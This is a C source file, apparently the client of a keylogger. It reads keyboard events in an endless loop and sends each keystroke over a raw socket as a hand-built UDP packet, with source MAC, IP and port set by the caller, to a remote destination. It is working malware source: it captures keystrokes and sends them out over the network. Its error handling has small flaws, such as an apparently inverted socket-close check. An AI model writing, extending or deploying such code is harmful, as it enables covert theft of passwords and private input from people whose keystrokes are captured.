#include "../include/client.h"

#include "../../udp_packet/include/udp_packet.h"
#include "../include/std_include.h"

static ErrorCode client_send(logger_client_t *client, uint8_t *packet_buffer, size_t packet_buffer_size);

ErrorCode client_init(logger_client_t *client, uint8_t interface_idx, uint8_t *dest_mac) {
    ErrorCode error_code = ERROR_SUCCESS;
    int i;

    if (client == NULL || dest_mac == NULL) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    if ((error_code = keylogger_init(&(client->keylogger))) != ERROR_SUCCESS)
        goto cleanup;

    if ((client->raw_sd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        error_code = ERROR_SOCKET;
        goto cleanup;
    }

    client->server_address.sll_ifindex = interface_idx;
    client->server_address.sll_halen = ETH_ALEN;

    for (i = 0; i < MAC_SIZE; i++)
        client->server_address.sll_addr[i] = dest_mac[i];

cleanup:
    if (error_code != ERROR_SUCCESS && client != NULL && client->raw_sd != -1 && close(client->raw_sd) == -1)
        perror("close() fail.");

    return error_code;
}

ErrorCode client_start(logger_client_t *client, uint8_t *src_mac, uint8_t *dest_mac, uint8_t *src_ip, uint8_t *dest_ip,
                       uint16_t src_port, uint16_t dest_port) {
    ErrorCode error_code = ERROR_SUCCESS;
    udp_packet_t packet;
    uint8_t data_buffer[DATA_BUFFER_SIZE];
    struct input_event key_event;

    if (client == NULL || src_mac == NULL || dest_mac == NULL || src_ip == NULL || dest_ip == NULL ||
        src_port <= 0 || dest_port <= 0) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    printf("keylogger started...\n");

    for (;;) {
        if ((error_code = keylogger_read_key_event(&(client->keylogger), &key_event)) != ERROR_SUCCESS)
            goto cleanup;

        memset(data_buffer, 0, DATA_BUFFER_SIZE);
        strcpy((char *)data_buffer, keylogger_parse_key_event(&key_event));

        printf("%s\n", (char *)data_buffer);

        if ((error_code = udp_packet_init(&packet)) != ERROR_SUCCESS)
            goto cleanup;

        if ((error_code = udp_packet_set_eth(&packet, src_mac, dest_mac)) != ERROR_SUCCESS)
            goto cleanup;

        if ((error_code = udp_packet_set_ip(&packet, src_ip, dest_ip)) != ERROR_SUCCESS)
            goto cleanup;

        if ((error_code = udp_packet_set_udp(&packet, src_port, dest_port)) != ERROR_SUCCESS)
            goto cleanup;

        if ((error_code = udp_packet_set_data(&packet, data_buffer, strlen((char *)data_buffer))) != ERROR_SUCCESS)
            goto cleanup;

        if ((error_code = client_send(client, packet.packet_buffer, PACKET_BUFFER_SIZE)) != ERROR_SUCCESS)
            goto cleanup;
    }

cleanup:
    return error_code;
}

ErrorCode client_destroy(logger_client_t *client) {
    ErrorCode error_code = ERROR_SUCCESS;

    if (client == NULL) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    if (client->raw_sd == -1 && close(client->raw_sd) < 0) {
        error_code = ERROR_CLOSE;
        goto cleanup;
    }

cleanup:
    return error_code;
}

static ErrorCode client_send(logger_client_t *client, uint8_t *packet_buffer, size_t packet_buffer_size) {
    ErrorCode error_code = ERROR_SUCCESS;
    ssize_t bytes;

    if (client == NULL || client->raw_sd == -1 || packet_buffer == NULL) {
        error_code = ERROR_INVALID_ARGS;
        goto cleanup;
    }

    if ((bytes = sendto(client->raw_sd, packet_buffer, packet_buffer_size, 0, (const struct sockaddr *)&(client->server_address), sizeof(struct sockaddr_ll))) < 0) {
        error_code = ERROR_SEND;
        goto cleanup;
    }

cleanup:
    return error_code;
}